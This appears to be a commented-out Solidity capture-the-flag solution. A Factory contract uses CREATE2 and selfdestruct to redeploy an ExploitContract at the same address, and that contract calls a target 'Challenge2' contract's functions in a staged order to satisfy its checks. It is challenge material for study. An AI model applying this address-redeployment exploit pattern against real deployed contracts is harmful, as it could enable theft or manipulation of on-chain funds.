// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "./Challenge2.sol";

// // import "hardhat/console.sol";
// // import "./Setup.sol";

// contract Factory {
//     address payable instance;
//     event Deployed(address addr, uint256 salt);

//     constructor(address payable _instance) {
//         instance = _instance;
//         bytes memory bytecode = getBytecode(_instance);
//         address payable exploiter = payable(getAddress(bytecode, 1));
//         deploy(bytecode, 1);
//         ExploitContract hacker = ExploitContract(exploiter);
//         hacker.finalize();
//         //deploy(bytecode, 1);
//         // hacker = ExploitContract(exploiter);
//         // hacker.finalize();
//     }

//     function finalize() public {
//         bytes memory bytecode = getBytecode(instance);
//         address payable exploiter = payable(getAddress(bytecode, 1));
//         deploy(bytecode, 1);
//         ExploitContract hacker = ExploitContract(exploiter);
//         hacker.finalize();
//     }

//     // 1. Get bytecode of contract to be deployed
//     // NOTE: _owner and _foo are arguments of the TestContract's constructor
//     function getBytecode(address payable _instance)
//         public
//         pure
//         returns (bytes memory)
//     {
//         bytes memory bytecode = type(ExploitContract).creationCode;

//         return abi.encodePacked(bytecode, abi.encode(_instance));
//     }

//     // 2. Compute the address of the contract to be deployed
//     // NOTE: _salt is a random number used to create an address
//     function getAddress(bytes memory bytecode, uint256 _salt)
//         public
//         view
//         returns (address)
//     {
//         bytes32 hash = keccak256(
//             abi.encodePacked(
//                 bytes1(0xff),
//                 address(this),
//                 _salt,
//                 keccak256(bytecode)
//             )
//         );

//         // NOTE: cast last 20 bytes of hash to address
//         return address(uint160(uint256(hash)));
//     }

//     // 3. Deploy the contract
//     // NOTE:
//     // Check the event log Deployed which contains the address of the deployed TestContract.
//     // The address in the log should equal the address computed from above.
//     function deploy(bytes memory bytecode, uint256 _salt) public {
//         address addr;

//         /*
//         NOTE: How to call create2

//         create2(v, p, n, s)
//         create new contract with code at memory p to p + n
//         and send v wei
//         and return the new address
//         where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))
//               s = big-endian 256-bit value
//         */
//         assembly {
//             addr := create2(
//                 0, // wei sent with current call
//                 // Actual code starts after skipping the first 32 bytes
//                 add(bytecode, 0x20),
//                 mload(bytecode), // Load the size of code contained in the first 32 bytes
//                 _salt // Salt from function arguments
//             )

//             if iszero(extcodesize(addr)) {
//                 revert(0, 0)
//             }
//         }

//         emit Deployed(addr, _salt);
//     }
// }

// contract ExploitContract {
//     Challenge2 instance;
//     uint256 public sup;

//     constructor(address payable _instance) payable {
//         instance = Challenge2(_instance);
//         sup = 1337;

//         try instance.third() {} catch {
//             instance.first();
//         }
//     }

//     function finalize() public {
//         try instance.second() {
//             selfdestruct(payable(address(0)));
//         } catch {
//             sup = 80085;
//             instance.fourth();
//         }
//     }

//     receive() external payable {}

//     function getBalance() public view returns (uint256) {
//         return address(this).balance;
//     }
// }
